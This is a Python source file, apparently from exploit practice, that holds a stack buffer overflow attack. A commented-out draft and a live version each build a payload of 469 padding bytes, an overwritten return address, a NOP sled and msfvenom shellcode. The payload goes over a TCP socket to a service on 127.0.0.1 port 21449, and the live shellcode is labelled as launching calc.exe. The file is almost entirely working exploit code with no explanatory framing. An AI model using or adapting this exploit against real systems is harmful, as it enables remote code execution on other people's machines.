#
# import socket
# from struct import pack
#
# IP = "127.0.0.1"
# port = 21449
#
# buf =  b""
# buf += b"\xbf\x44\xd9\x1b\x27\xda\xde\xd9\x74\x24\xf4\x58"
# buf += b"\x29\xc9\xb1\x31\x83\xe8\xfc\x31\x78\x0e\x03\x3c"
# buf += b"\xd7\xf9\xd2\x40\x0f\x7f\x1c\xb8\xd0\xe0\x94\x5d"
# buf += b"\xe1\x20\xc2\x16\x52\x91\x80\x7a\x5f\x5a\xc4\x6e"
# buf += b"\xd4\x2e\xc1\x81\x5d\x84\x37\xac\x5e\xb5\x04\xaf"
# buf += b"\xdc\xc4\x58\x0f\xdc\x06\xad\x4e\x19\x7a\x5c\x02"
# buf += b"\xf2\xf0\xf3\xb2\x77\x4c\xc8\x39\xcb\x40\x48\xde"
# buf += b"\x9c\x63\x79\x71\x96\x3d\x59\x70\x7b\x36\xd0\x6a"
# buf += b"\x98\x73\xaa\x01\x6a\x0f\x2d\xc3\xa2\xf0\x82\x2a"
# buf += b"\x0b\x03\xda\x6b\xac\xfc\xa9\x85\xce\x81\xa9\x52"
# buf += b"\xac\x5d\x3f\x40\x16\x15\xe7\xac\xa6\xfa\x7e\x27"
# buf += b"\xa4\xb7\xf5\x6f\xa9\x46\xd9\x04\xd5\xc3\xdc\xca"
# buf += b"\x5f\x97\xfa\xce\x04\x43\x62\x57\xe1\x22\x9b\x87"
# buf += b"\x4a\x9a\x39\xcc\x67\xcf\x33\x8f\xed\x0e\xc1\xaa"
# buf += b"\x40\x10\xd9\xb4\xf4\x79\xe8\x3f\x9b\xfe\xf5\xea"
# buf += b"\xdf\xf1\xbf\xb6\x76\x9a\x19\x23\xcb\xc7\x99\x9e"
# buf += b"\x08\xfe\x19\x2a\xf1\x05\x01\x5f\xf4\x42\x85\x8c"
# buf += b"\x84\xdb\x60\xb2\x3b\xdb\xa0\xd1\xd6\x47\x65\x70"
# buf += b"\x51\xed\x79"
#
# offset = 469
#
# buffer = b"A"*offset
#
# eip = pack('<L', 0x621014E3)
#
# nop = b"\x90" * 32
#
# payload = buffer + eip + nop + buf
#
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect((IP, port))
#
# s.send(payload)
# s.close()
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xda\xc5\xbf\x31\x98\xcc\x99\xd9\x74\x24\xf4\x5e"
    buf += b"\x2b\xc9\xb1\x31\x31\x7e\x18\x03\x7e\x18\x83\xee"
    buf += b"\xcd\x7a\x39\x65\xc5\xf9\xc2\x96\x15\x9e\x4b\x73"
    buf += b"\x24\x9e\x28\xf7\x16\x2e\x3a\x55\x9a\xc5\x6e\x4e"
    buf += b"\x29\xab\xa6\x61\x9a\x06\x91\x4c\x1b\x3a\xe1\xcf"
    buf += b"\x9f\x41\x36\x30\x9e\x89\x4b\x31\xe7\xf4\xa6\x63"
    buf += b"\xb0\x73\x14\x94\xb5\xce\xa5\x1f\x85\xdf\xad\xfc"
    buf += b"\x5d\xe1\x9c\x52\xd6\xb8\x3e\x54\x3b\xb1\x76\x4e"
    buf += b"\x58\xfc\xc1\xe5\xaa\x8a\xd3\x2f\xe3\x73\x7f\x0e"
    buf += b"\xcc\x81\x81\x56\xea\x79\xf4\xae\x09\x07\x0f\x75"
    buf += b"\x70\xd3\x9a\x6e\xd2\x90\x3d\x4b\xe3\x75\xdb\x18"
    buf += b"\xef\x32\xaf\x47\xf3\xc5\x7c\xfc\x0f\x4d\x83\xd3"
    buf += b"\x86\x15\xa0\xf7\xc3\xce\xc9\xae\xa9\xa1\xf6\xb1"
    buf += b"\x12\x1d\x53\xb9\xbe\x4a\xee\xe0\xd4\x8d\x7c\x9f"
    buf += b"\x9a\x8e\x7e\xa0\x8a\xe6\x4f\x2b\x45\x70\x50\xfe"
    buf += b"\x22\x8e\x1a\xa3\x02\x07\xc3\x31\x17\x4a\xf4\xef"
    buf += b"\x5b\x73\x77\x1a\x23\x80\x67\x6f\x26\xcc\x2f\x83"
    buf += b"\x5a\x5d\xda\xa3\xc9\x5e\xcf\xc7\x8c\xcc\x93\x29"
    buf += b"\x2b\x75\x31\x36"

    offset = 469
    buffer = b"A"*offset
    eip = pack('<L', 0x621014E3)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))

    s.send(payload)
    s.close()

exploit()
